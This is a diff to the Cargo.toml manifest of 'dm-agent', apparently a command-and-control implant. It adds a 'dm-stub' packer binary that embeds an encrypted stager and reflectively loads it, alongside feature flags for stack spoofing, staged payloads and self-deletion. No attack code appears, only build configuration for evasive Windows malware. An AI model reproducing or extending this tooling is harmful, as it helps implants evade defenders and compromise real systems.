@@ -3,6 +3,17 @@ name    = "dm-agent"
 version = "0.1.0"
 edition = "2021"
 
+[[bin]]
+name = "dm-agent"
+path = "src/main.rs"
+
+# Packer stub: a minimal decryptor that embeds the encrypted stager and UDRL-loads it.
+# Build with: DM_STAGER_PATH=/path/to/stager.exe cargo build --release \
+#             --bin dm-stub --features "udrl,packer-stub" --target x86_64-pc-windows-gnu
+[[bin]]
+name = "dm-stub"
+path = "src/stub_main.rs"
+
 # Build-time configuration injected by the build service
 # These are set via environment variables when building a specific payload.
 # Default values here are for local development only.
@@ -34,6 +45,7 @@ stack-spoof    = []
 udrl           = []
 staged-payload = []
 self-delete    = []
+packer-stub    = ["udrl"]
 
 [dependencies]
 # Crypto
